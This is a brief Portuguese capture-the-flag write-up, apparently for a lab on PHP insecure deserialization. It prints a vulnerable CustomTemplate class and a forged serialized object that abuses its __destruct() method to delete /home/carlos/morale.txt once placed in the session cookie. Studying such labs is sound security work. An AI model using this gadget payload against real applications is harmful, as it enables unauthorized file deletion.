#ctf 

Objeto serializado em PHP encontrado no cookie:

```PHP
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"sos9fte5u3wo7hhzqhg9psrmouz7jc8a";}
```

Existe um comentário no HTML que nos leva para `/libs/CustomTemplate.php`

```PHP
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

O `__destruct()` é um método mágico chamado quando um objeto é deletado. Criando um objeto serializado dessa classe:

```PHP
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Basta converter para base64 e passar no cookie de sessão. GG